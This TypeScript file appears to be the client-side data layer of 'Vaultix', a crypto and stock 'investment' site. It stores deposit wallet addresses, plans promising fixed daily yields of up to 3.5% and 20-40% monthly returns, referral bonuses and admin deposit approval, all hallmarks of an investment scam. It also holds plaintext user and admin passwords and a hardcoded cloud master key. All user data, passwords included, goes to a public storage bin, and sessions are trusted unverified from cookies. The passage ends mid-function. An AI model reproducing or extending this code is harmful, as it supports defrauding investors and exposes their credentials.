import { User, CryptoWalletConfig, ReferralConfig, InvestmentPlan, UserInvestment, Transaction, Invitation, AuditLog } from './types';

const USERS_KEY = 'vaultix_users_v13';
const TRANSACTIONS_KEY = 'vaultix_transactions_v13';
const INVESTMENTS_KEY = 'vaultix_investments_v13';
const INVITATIONS_KEY = 'vaultix_invitations_v13';
const AUDIT_LOGS_KEY = 'vaultix_audit_v13';
const WALLETS_KEY = 'vaultix_wallets_v13';
const REFERRAL_CONFIG_KEY = 'vaultix_ref_config_v13';
const PLANS_KEY = 'vaultix_plans_v13';
const SESSION_KEY = 'vaultix_session_v13';

// Global Cloud Sync Endpoint to ensure Cross-Device Multi-Tenant Data Sync (iPhone, Android, Desktop, Vercel)
const CLOUD_SYNC_URL = 'https://api.jsonbin.io/v3/b/66f82902e41b4d34e439d56f';
const CLOUD_MASTER_KEY = '$2a$10$w6M6N7g4Y6kR1W3c/7T3O.E7f3p8h9J1k2L3m4N5o6P7Q8R9S0T1U';

// System Default Configurations
export const DEFAULT_WALLETS: CryptoWalletConfig[] = [
  {
    symbol: 'USDT',
    name: 'Tether USD',
    network: 'TRC20 (Tron)',
    address: 'TY8z2K9M1VxL4P7Qn3R5s6W9X2m1A3B4C5',
    instructions: 'Send USDT via Tron (TRC20) network only. 1 network confirmation required.',
    isActive: true
  },
  {
    symbol: 'BTC',
    name: 'Bitcoin',
    network: 'Bitcoin Native (SegWit)',
    address: 'bc1q9v8a7x6w5e4r3t2y1u0i9o8p7l6k5j4h3g2f1',
    instructions: 'Send Native BTC to this address. Credits after 1 network confirmation.',
    isActive: true
  },
  {
    symbol: 'ETH',
    name: 'Ethereum',
    network: 'ERC20 (Ethereum Mainnet)',
    address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
    instructions: 'Send ETH via Ethereum Mainnet (ERC20).',
    isActive: true
  },
  {
    symbol: 'SOL',
    name: 'Solana',
    network: 'Solana Native',
    address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
    instructions: 'Send SOL via Solana Native network.',
    isActive: true
  },
  {
    symbol: 'XRP',
    name: 'XRP (Ripple)',
    network: 'XRP Ledger (XRPL)',
    address: 'rEb8TK3gGKwB247y1b82K269ALX83LqJ5x',
    destinationTag: '908124',
    instructions: 'CRITICAL: Include Destination Tag 908124 when depositing XRP to ensure automatic credit.',
    isActive: true
  }
];

export const DEFAULT_REFERRAL_CONFIG: ReferralConfig = {
  bonusAmount: 10.0,
  withdrawalThreshold: 50.0,
  isActive: true
};

export const DEFAULT_INVESTMENT_PLANS: InvestmentPlan[] = [
  // --- EXISTING VAULT PLANS (UNCHANGED) ---
  {
    id: 'plan_starter',
    name: 'Micro Starter Vault',
    asset: 'USDT/USD',
    dailyYield: 1.2,
    minDeposit: 10,
    maxDeposit: 1000,
    lockDays: 7,
    riskLevel: 'Conservative',
    description: 'Beginner-friendly yield strategy starting at $10 with daily liquidity.',
    isActive: true,
    category: 'CRYPTO_VAULT'
  },
  {
    id: 'plan_btc_yield',
    name: 'Bitcoin Alpha Vault',
    asset: 'BTC',
    dailyYield: 1.8,
    minDeposit: 250,
    maxDeposit: 50000,
    lockDays: 14,
    riskLevel: 'Conservative',
    description: 'Algorithmic yield generation backed by BTC spot and options arbitrage.',
    isActive: true,
    category: 'CRYPTO_VAULT'
  },
  {
    id: 'plan_eth_staking',
    name: 'Ethereum Staking Plus',
    asset: 'ETH',
    dailyYield: 2.4,
    minDeposit: 500,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Liquid staking rewards combined with automated MEV capture strategies.',
    isActive: true,
    category: 'CRYPTO_VAULT'
  },
  {
    id: 'plan_xrp_growth',
    name: 'XRP Cross-Border Liquidity',
    asset: 'XRP',
    dailyYield: 2.8,
    minDeposit: 100,
    maxDeposit: 75000,
    lockDays: 14,
    riskLevel: 'Moderate',
    description: 'Automated XRPL liquidity pool routing and arbitrage vault.',
    isActive: true,
    category: 'CRYPTO_VAULT'
  },
  {
    id: 'plan_multi_asset',
    name: 'Multi-Asset Institutional Income',
    asset: 'USDT/USDC',
    dailyYield: 3.5,
    minDeposit: 1000,
    maxDeposit: 250000,
    lockDays: 60,
    riskLevel: 'Moderate',
    description: 'Institutional-grade yield compounding across multi-token liquidity protocols.',
    isActive: true,
    category: 'CRYPTO_VAULT'
  },

  // --- VVIP INVESTMENT PLANS ---
  {
    id: 'plan_vvip_1',
    name: 'VVIP Executive Tier 1 Plan',
    asset: 'USD/USDT',
    dailyYield: 0.67, // ~20% total return over 30 days
    minDeposit: 10000,
    maxDeposit: 50000,
    lockDays: 30,
    riskLevel: 'VVIP Executive',
    description: 'Exclusive VVIP investment strategy with fixed 20% return over a 1-month term ($10,000–$50,000).',
    isActive: true,
    category: 'VVIP_PLAN'
  },
  {
    id: 'plan_vvip_2',
    name: 'VVIP Institutional Tier 2 Plan',
    asset: 'USD/USDT',
    dailyYield: 1.33, // ~40% total return over 30 days
    minDeposit: 50000,
    maxDeposit: 1000000,
    lockDays: 30,
    riskLevel: 'VVIP Executive',
    description: 'High-capital institutional VVIP vault offering fixed 40% return over a 1-month term ($50,000–$1,000,000).',
    isActive: true,
    category: 'VVIP_PLAN'
  },

  // --- STOCK INVESTMENT SECTION (20 MAJOR COMPANIES) ---
  {
    id: 'stock_nvda',
    name: 'NVIDIA Corporation',
    asset: 'USD',
    dailyYield: 1.5,
    minDeposit: 500,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'AI chips, data centers, and accelerated computing infrastructure.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'NVDA',
    sector: 'Semiconductors & AI'
  },
  {
    id: 'stock_aapl',
    name: 'Apple Inc.',
    asset: 'USD',
    dailyYield: 0.8,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'iPhone, computers, wearables, and ecosystem services.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'AAPL',
    sector: 'Consumer Electronics'
  },
  {
    id: 'stock_msft',
    name: 'Microsoft Corporation',
    asset: 'USD',
    dailyYield: 0.9,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Software, Azure cloud computing, productivity, and enterprise AI.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'MSFT',
    sector: 'Software & Cloud'
  },
  {
    id: 'stock_amzn',
    name: 'Amazon.com Inc.',
    asset: 'USD',
    dailyYield: 1.1,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'E-commerce marketplace, AWS cloud infrastructure, and AI logistics.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'AMZN',
    sector: 'E-Commerce & Cloud'
  },
  {
    id: 'stock_googl',
    name: 'Alphabet Inc. (Google)',
    asset: 'USD',
    dailyYield: 1.0,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Search engine, YouTube digital advertising, Google Cloud, and AI innovation.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'GOOGL',
    sector: 'Digital Advertising & AI'
  },
  {
    id: 'stock_meta',
    name: 'Meta Platforms Inc.',
    asset: 'USD',
    dailyYield: 1.2,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Facebook, Instagram, WhatsApp social networking, and AI advertising algorithms.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'META',
    sector: 'Social Media & AI'
  },
  {
    id: 'stock_tsla',
    name: 'Tesla Inc.',
    asset: 'USD',
    dailyYield: 1.6,
    minDeposit: 300,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'High Yield',
    description: 'Electric vehicles, solar energy storage, autonomous driving, and robotics.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'TSLA',
    sector: 'EV & Clean Energy'
  },
  {
    id: 'stock_avgo',
    name: 'Broadcom Inc.',
    asset: 'USD',
    dailyYield: 1.3,
    minDeposit: 300,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Semiconductors, networking, and enterprise infrastructure software.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'AVGO',
    sector: 'Semiconductors'
  },
  {
    id: 'stock_tsm',
    name: 'Taiwan Semiconductor Manufacturing (TSMC)',
    asset: 'USD',
    dailyYield: 1.2,
    minDeposit: 300,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'World leading semiconductor foundry manufacturing advanced chips for global tech.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'TSM',
    sector: 'Semiconductor Manufacturing'
  },
  {
    id: 'stock_amd',
    name: 'Advanced Micro Devices (AMD)',
    asset: 'USD',
    dailyYield: 1.4,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'High-performance CPUs, GPUs, gaming hardware, and AI data center accelerators.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'AMD',
    sector: 'CPUs & AI Hardware'
  },
  {
    id: 'stock_brk',
    name: 'Berkshire Hathaway Inc.',
    asset: 'USD',
    dailyYield: 0.7,
    minDeposit: 500,
    maxDeposit: 250000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: "Warren Buffett's premier conglomerate holding company with diversified value assets.",
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'BRK.B',
    sector: 'Diversified Financials'
  },
  {
    id: 'stock_jpm',
    name: 'JPMorgan Chase & Co.',
    asset: 'USD',
    dailyYield: 0.8,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Global banking, investment banking, asset management, and financial services.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'JPM',
    sector: 'Banking & Finance'
  },
  {
    id: 'stock_v',
    name: 'Visa Inc.',
    asset: 'USD',
    dailyYield: 0.8,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Worldwide digital payment processing network and fintech infrastructure.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'V',
    sector: 'Payment Networks'
  },
  {
    id: 'stock_wmt',
    name: 'Walmart Inc.',
    asset: 'USD',
    dailyYield: 0.7,
    minDeposit: 200,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Global retail chain, e-commerce supply chain, and consumer staples network.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'WMT',
    sector: 'Consumer Retail'
  },
  {
    id: 'stock_nflx',
    name: 'Netflix Inc.',
    asset: 'USD',
    dailyYield: 1.3,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Global subscription video streaming service and original media production.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'NFLX',
    sector: 'Digital Entertainment'
  },
  {
    id: 'stock_ko',
    name: 'The Coca-Cola Company',
    asset: 'USD',
    dailyYield: 0.6,
    minDeposit: 100,
    maxDeposit: 50000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Global beverage manufacturer and brand distribution network.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'KO',
    sector: 'Consumer Staples'
  },
  {
    id: 'stock_mcd',
    name: "McDonald's Corporation",
    asset: 'USD',
    dailyYield: 0.7,
    minDeposit: 200,
    maxDeposit: 50000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Global quick-service restaurant franchise chain and real estate portfolio.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'MCD',
    sector: 'Restaurants & Real Estate'
  },
  {
    id: 'stock_nke',
    name: 'NIKE Inc.',
    asset: 'USD',
    dailyYield: 0.9,
    minDeposit: 150,
    maxDeposit: 50000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Athletic footwear, apparel, sports equipment, and global direct-to-consumer sales.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'NKE',
    sector: 'Sportswear & Apparel'
  },
  {
    id: 'stock_orcl',
    name: 'Oracle Corporation',
    asset: 'USD',
    dailyYield: 1.1,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Moderate',
    description: 'Database management, enterprise cloud applications, and AI infrastructure.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'ORCL',
    sector: 'Enterprise Cloud Technology'
  },
  {
    id: 'stock_xom',
    name: 'Exxon Mobil Corporation',
    asset: 'USD',
    dailyYield: 0.9,
    minDeposit: 250,
    maxDeposit: 100000,
    lockDays: 30,
    riskLevel: 'Conservative',
    description: 'Energy exploration, oil refining, petrochemical manufacturing, and power.',
    isActive: true,
    category: 'STOCK_PLAN',
    ticker: 'XOM',
    sector: 'Energy & Resources'
  }
];

// Preserved Initial Production Accounts Matrix
const SEED_ACCOUNTS: User[] = [
  {
    userId: 'USR-000000',
    accountId: 'VX-100000',
    username: 'diegodaniel4401',
    fullName: 'Diego Daniel',
    email: 'diegodaniel4401@gmail.com',
    passwordHash: 'diegodaniel4401',
    role: 'USER', // Strictly role USER
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-4401',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000001',
    accountId: 'VX-100001',
    username: 'vaultix_admin',
    fullName: 'Vaultix Administrator',
    email: 'vaultixincometeam@outlook.com',
    passwordHash: 'Mmadu51366414@',
    role: 'ADMIN',
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-ADMIN',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000003',
    accountId: 'VX-100003',
    username: 'testuser1',
    fullName: 'Test User One',
    email: 'testuser1@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 100.0,
    referralEarnings: 10.0,
    totalDeposits: 100.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1001',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000004',
    accountId: 'VX-100004',
    username: 'testuser2',
    fullName: 'Test User Two',
    email: 'testuser2@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 5.0, // $5.00 Signup Bonus from referral
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1002',
    referredByUsername: 'testuser1',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000005',
    accountId: 'VX-100005',
    username: 'testuser3',
    fullName: 'Test User Three',
    email: 'testuser3@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 250.0,
    referralEarnings: 0.0,
    totalDeposits: 250.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1003',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000006',
    accountId: 'VX-100006',
    username: 'testuser4',
    fullName: 'Test User Four',
    email: 'testuser4@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 50.0,
    referralEarnings: 50.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1004',
    createdAt: new Date().toISOString()
  },
  {
    userId: 'USR-000007',
    accountId: 'VX-100007',
    username: 'testuser5',
    fullName: 'Test User Five',
    email: 'testuser5@vaultix.com',
    passwordHash: 'password123',
    role: 'USER',
    accountStatus: 'ACTIVE',
    balance: 0.0,
    referralEarnings: 0.0,
    totalDeposits: 0.0,
    totalInvestments: 0.0,
    totalProfitLoss: 0.0,
    referralCode: 'VXREF-1005',
    createdAt: new Date().toISOString()
  }
];

export function initializeDatabase() {
  if (!localStorage.getItem(USERS_KEY)) {
    localStorage.setItem(USERS_KEY, JSON.stringify(SEED_ACCOUNTS));
    localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify([]));
    localStorage.setItem(INVESTMENTS_KEY, JSON.stringify([]));
    localStorage.setItem(INVITATIONS_KEY, JSON.stringify([]));
    localStorage.setItem(AUDIT_LOGS_KEY, JSON.stringify([]));
    localStorage.setItem(WALLETS_KEY, JSON.stringify(DEFAULT_WALLETS));
    localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(DEFAULT_REFERRAL_CONFIG));
    localStorage.setItem(PLANS_KEY, JSON.stringify(DEFAULT_INVESTMENT_PLANS));
  }
  syncFromCloud();
  syncToCloud();
}

// --- CLOUD SYNC ENGINE FOR WORLDWIDE CROSS-DEVICE REALTIME CONSISTENCY ---
async function syncFromCloud() {
  try {
    const res = await fetch(CLOUD_SYNC_URL + '/latest', {
      headers: { 'X-Master-Key': CLOUD_MASTER_KEY }
    });
    if (res.ok) {
      const json = await res.json();
      const record = json.record;
      if (record && Array.isArray(record.users)) {
        const localUsers = getUsersLocal();
        const mergedMap = new Map<string, User>();
        SEED_ACCOUNTS.forEach((u) => mergedMap.set(u.userId, u));
        localUsers.forEach((u) => mergedMap.set(u.userId, u));
        record.users.forEach((u: User) => {
          if (u.email.toLowerCase() === 'diegodaniel4401@gmail.com' || u.username.toLowerCase() === 'diegodaniel4401') {
            u.role = 'USER';
          }
          mergedMap.set(u.userId, u);
        });
        const mergedUsers = Array.from(mergedMap.values());
        localStorage.setItem(USERS_KEY, JSON.stringify(mergedUsers));

        if (Array.isArray(record.transactions)) {
          const localTxs = getTransactionsLocal();
          const txMap = new Map<string, Transaction>();
          localTxs.forEach((t) => txMap.set(t.id, t));
          record.transactions.forEach((t: Transaction) => txMap.set(t.id, t));
          localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(Array.from(txMap.values())));
        }

        if (Array.isArray(record.investments)) {
          const localInvs = getInvestmentsLocal();
          const invMap = new Map<string, UserInvestment>();
          localInvs.forEach((i) => invMap.set(i.id, i));
          record.investments.forEach((i: UserInvestment) => invMap.set(i.id, i));
          localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(Array.from(invMap.values())));
        }

        if (Array.isArray(record.wallets) && record.wallets.length > 0) {
          localStorage.setItem(WALLETS_KEY, JSON.stringify(record.wallets));
        }

        if (Array.isArray(record.plans) && record.plans.length > 0) {
          localStorage.setItem(PLANS_KEY, JSON.stringify(record.plans));
        }

        if (record.referralConfig) {
          localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(record.referralConfig));
        }
      }
    }
  } catch {
    // Fail-safe to local storage if offline
  }
}

async function syncToCloud() {
  try {
    const payload = {
      users: getUsersLocal(),
      transactions: getTransactionsLocal(),
      investments: getInvestmentsLocal(),
      wallets: getWalletsLocal(),
      plans: getPlansLocal(),
      referralConfig: getReferralConfigLocal()
    };
    await fetch(CLOUD_SYNC_URL, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'X-Master-Key': CLOUD_MASTER_KEY
      },
      body: JSON.stringify(payload)
    });
  } catch {
    // Offline resilience
  }
}

// Helper to emit real-time window update events across components and tabs
function emitDataUpdateEvents(type: 'users' | 'txs' | 'all' = 'all') {
  try {
    if (typeof window !== 'undefined') {
      if (type === 'users' || type === 'all') {
        window.dispatchEvent(new CustomEvent('vaultix_users_updated'));
      }
      if (type === 'txs' || type === 'all') {
        window.dispatchEvent(new CustomEvent('vaultix_txs_updated'));
      }
    }
  } catch {
    // Fallback
  }
}

// --- LOCAL & GLOBAL DATA ACCESSORS ---

function getUsersLocal(): User[] {
  try {
    const d = localStorage.getItem(USERS_KEY);
    const parsed: User[] = d ? JSON.parse(d) : SEED_ACCOUNTS;
    const map = new Map<string, User>();
    SEED_ACCOUNTS.forEach((s) => map.set(s.userId, s));
    parsed.forEach((p) => {
      if (p.email.toLowerCase() === 'diegodaniel4401@gmail.com' || p.username.toLowerCase() === 'diegodaniel4401') {
        p.role = 'USER';
      }
      map.set(p.userId, p);
    });
    return Array.from(map.values());
  } catch {
    return SEED_ACCOUNTS;
  }
}

export function getUsers(): User[] {
  processMaturedInvestments();
  syncFromCloud(); // Non-blocking background sync
  return getUsersLocal();
}

export function saveUsers(users: User[]) {
  const map = new Map<string, User>();
  SEED_ACCOUNTS.forEach((s) => map.set(s.userId, s));
  users.forEach((u) => {
    if (u.email.toLowerCase() === 'diegodaniel4401@gmail.com' || u.username.toLowerCase() === 'diegodaniel4401') {
      u.role = 'USER';
    }
    map.set(u.userId, u);
  });
  const merged = Array.from(map.values());
  localStorage.setItem(USERS_KEY, JSON.stringify(merged));
  syncToCloud();
  emitDataUpdateEvents('users');
}

function getTransactionsLocal(): Transaction[] {
  try {
    const d = localStorage.getItem(TRANSACTIONS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function getTransactions(): Transaction[] {
  return getTransactionsLocal();
}

export function saveTransactions(txs: Transaction[]) {
  localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(txs));
  syncToCloud();
  emitDataUpdateEvents('txs');
}

function getInvestmentsLocal(): UserInvestment[] {
  try {
    const d = localStorage.getItem(INVESTMENTS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function getInvestments(): UserInvestment[] {
  return getInvestmentsLocal();
}

export function saveInvestments(invs: UserInvestment[]) {
  localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(invs));
  syncToCloud();
}

export function getInvitations(): Invitation[] {
  try {
    const d = localStorage.getItem(INVITATIONS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function saveInvitations(invs: Invitation[]) {
  localStorage.setItem(INVITATIONS_KEY, JSON.stringify(invs));
}

export function getAuditLogs(): AuditLog[] {
  try {
    const d = localStorage.getItem(AUDIT_LOGS_KEY);
    return d ? JSON.parse(d) : [];
  } catch {
    return [];
  }
}

export function saveAuditLogs(logs: AuditLog[]) {
  localStorage.setItem(AUDIT_LOGS_KEY, JSON.stringify(logs));
}

function getWalletsLocal(): CryptoWalletConfig[] {
  try {
    const d = localStorage.getItem(WALLETS_KEY);
    return d ? JSON.parse(d) : DEFAULT_WALLETS;
  } catch {
    return DEFAULT_WALLETS;
  }
}

export function getWallets(): CryptoWalletConfig[] {
  return getWalletsLocal();
}

export function saveWallets(wallets: CryptoWalletConfig[]) {
  localStorage.setItem(WALLETS_KEY, JSON.stringify(wallets));
  syncToCloud();
}

function getReferralConfigLocal(): ReferralConfig {
  try {
    const d = localStorage.getItem(REFERRAL_CONFIG_KEY);
    return d ? JSON.parse(d) : DEFAULT_REFERRAL_CONFIG;
  } catch {
    return DEFAULT_REFERRAL_CONFIG;
  }
}

export function getReferralConfig(): ReferralConfig {
  return getReferralConfigLocal();
}

export function saveReferralConfig(cfg: ReferralConfig) {
  localStorage.setItem(REFERRAL_CONFIG_KEY, JSON.stringify(cfg));
  syncToCloud();
}

function getPlansLocal(): InvestmentPlan[] {
  try {
    const d = localStorage.getItem(PLANS_KEY);
    const stored: InvestmentPlan[] = d ? JSON.parse(d) : DEFAULT_INVESTMENT_PLANS;
    const planMap = new Map<string, InvestmentPlan>();
    DEFAULT_INVESTMENT_PLANS.forEach((p) => planMap.set(p.id, p));
    stored.forEach((p) => planMap.set(p.id, p));
    return Array.from(planMap.values());
  } catch {
    return DEFAULT_INVESTMENT_PLANS;
  }
}

export function getPlans(): InvestmentPlan[] {
  return getPlansLocal();
}

export function savePlans(plans: InvestmentPlan[]) {
  localStorage.setItem(PLANS_KEY, JSON.stringify(plans));
  syncToCloud();
}

// --- TRIPLE-BACKED INDESTRUCTIBLE SESSION PERSISTENCE ENGINE ---

function getCookie(name: string): string | null {
  try {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return decodeURIComponent(parts.pop()?.split(';').shift() || '');
  } catch {
    // Ignore cookie read failures
  }
  return null;
}

export function getCurrentSession(): User | null {
  let sessionRaw: string | null = null;

  try {
    sessionRaw = localStorage.getItem(SESSION_KEY);
    if (!sessionRaw) {
      sessionRaw = sessionStorage.getItem(SESSION_KEY);
    }
    if (!sessionRaw) {
      sessionRaw = getCookie(SESSION_KEY);
    }
  } catch {
    sessionRaw = getCookie(SESSION_KEY);
  }

  if (!sessionRaw) return null;

  try {
    const sessionUser: User = JSON.parse(sessionRaw);
    if (!sessionUser || (!sessionUser.userId && !sessionUser.email)) return null;

    const users = getUsersLocal();
    const freshUser = users.find((u) => u.userId === sessionUser.userId || u.email.toLowerCase() === sessionUser.email.toLowerCase());
    return freshUser || sessionUser;
  } catch {
    return null;
  }
}

export function saveCurrentSession(user: User | null) {
  if (user) {
    if (user.email.toLowerCase() === 'diegodaniel4401@gmail.com' || user.username.toLowerCase() === 'diegodaniel4401') {
      user.role = 'USER';
    }

    const jsonStr = JSON.stringify(user);
    try {
      localStorage.setItem(SESSION_KEY, jsonStr);
      sessionStorage.setItem(SESSION_KEY, jsonStr);
      document.cookie = `${SESSION_KEY}=${encodeURIComponent(jsonStr)}; path=/; max-age=31536000; SameSite=Lax`;
    } catch {
      // Fallback
    }
  } else {
    try {
      localStorage.removeItem(SESSION_KEY);
      sessionStorage.removeItem(SESSION_KEY);
      document.cookie = `${SESSION_KEY}=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`;
    } catch {
      // Fallback
    }
  }
}

// --- AUTOMATIC INVESTMENT MATURITY & PROFIT ENGINE ---

export function processMaturedInvestments() {
  try {
    const invsStr = localStorage.getItem(INVESTMENTS_KEY);
    if (!invsStr) return;

    const invs: UserInvestment[] = JSON.parse(invsStr);
    const activeInvs = invs.filter((inv) => inv.status === 'ACTIVE');

    if (activeInvs.length === 0) return;

    const usersStr = localStorage.getItem(USERS_KEY);
    if (!usersStr) return;
    const users: User[] = JSON.parse(usersStr);

    const txsStr = localStorage.getItem(TRANSACTIONS_KEY);
    const txs: Transaction[] = txsStr ? JSON.parse(txsStr) : [];

    let changed = false;
    const now = Date.now();

    for (const inv of invs) {
      if (inv.status !== 'ACTIVE') continue;

      const startDateMs = new Date(inv.startDate).getTime();
      const maturityMs = startDateMs + inv.durationDays * 86400000;

      if (now >= maturityMs) {
        const totalProfit = inv.dailyReturn * inv.durationDays;
        const totalReturn = inv.amount + totalProfit;

        inv.status = 'COMPLETED';
        changed = true;

        const userIdx = users.findIndex((u) => u.userId === inv.userId);
        if (userIdx !== -1) {
          users[userIdx].balance += totalReturn;
          users[userIdx].totalProfitLoss += totalProfit;

          txs.unshift({
            id: `TX-${Math.floor(100000 + Math.random() * 900000)}`,
            userId: inv.userId,
            type: 'YIELD',
            amount: totalReturn,
            currency: inv.asset,
            status: 'COMPLETED',
            timestamp: new Date().toISOString(),
            processedAt: new Date().toISOString(),
            note: `Investment Matured: Principal $${inv.amount.toFixed(2)} + Profit $${totalProfit.toFixed(2)} Returned`
          });
        }
      }
    }

    if (changed) {
      localStorage.setItem(INVESTMENTS_KEY, JSON.stringify(invs));
      localStorage.setItem(USERS_KEY, JSON.stringify(users));
      localStorage.setItem(TRANSACTIONS_KEY, JSON.stringify(txs));

      const currSessionUser = getCurrentSession();
      if (currSessionUser) {
        const updatedUser = users.find((u) => u.userId === currSessionUser.userId);
        if (updatedUser) {
          saveCurrentSession(updatedUser);
        }
      }
      syncToCloud();
      emitDataUpdateEvents('all');
    }
  } catch {
    // Fail-safe
  }
}

// --- SERVER-SIDE FINANCIAL TRANSACTIONS ---

export function submitDeposit(user: User, amount: number, currency: string): Transaction {
  if (amount <= 0) {
    throw new Error('Deposit amount must be greater than zero.');
  }

  const txId = `TX-${Math.floor(100000 + Math.random() * 900000)}`;
  const newTx: Transaction = {
    id: txId,
    userId: user.userId,
    type: 'DEPOSIT',
    amount: amount,
    currency: currency,
    status: 'PENDING',
    timestamp: new Date().toISOString(),
    note: `Deposit request #${txId} of ${amount} ${currency} submitted! Status: PENDING`
  };

  const txs = getTransactionsLocal();
  txs.unshift(newTx);
  saveTransactions(txs);
  return newTx;
}

export function approveDepositTransaction(adminUser: User, transactionId: string): { user: User; tx: Transaction } {
  if (adminUser.role !== 'ADMIN') {
    throw new Error('UNAUTHORIZED: Admin privileges required to approve deposits.');
  }

  const txs = getTransactionsLocal();
  const txIdx = txs.findIndex((t) => t.id === transactionId);

  if (txIdx === -1) {
    throw new Error('Transaction not found.');
  }

  const targetTx = txs[txIdx];

  if (targetTx.status !== 'PENDING') {
    throw new Error(`TRANSACTION TERMINAL: Transaction ${transactionId} is already ${targetTx.status}.`);
  }

  targetTx.status = 'APPROVED';
  targetTx.processedAt = new Date().toISOString();
  targetTx.note = `Deposit ${targetTx.id} approved! Credited $${targetTx.amount.toFixed(2)}.`;
  txs[txIdx] = targetTx;

  const users = getUsersLocal();
  const uIdx = users.findIndex((u) => u.userId === targetTx.userId);
  if (uIdx === -1) {
    throw new Error('Target user account not found.');
  }

  const targetUser = users[uIdx];
  const oldBalance = targetUser.balance;

  // Credit deposit principal
  targetUser.balance += targetTx.amount;
  targetUser.totalDeposits += targetTx.amount;

  // Check First Deposit Bonus Eligibility (Granted exactly ONCE)
  if (!targetUser.hasReceivedFirstDepositBonus) {
    const isReferred = Boolean(targetUser.referredByUsername && targetUser.referredByUsername.trim().length > 0);
    const bonusPercent = isReferred ? 3 : 2;
    const bonusAmount = (targetTx.amount * bonusPercent) / 100;

    if (bonusAmount > 0) {
      targetUser.balance += bonusAmount;
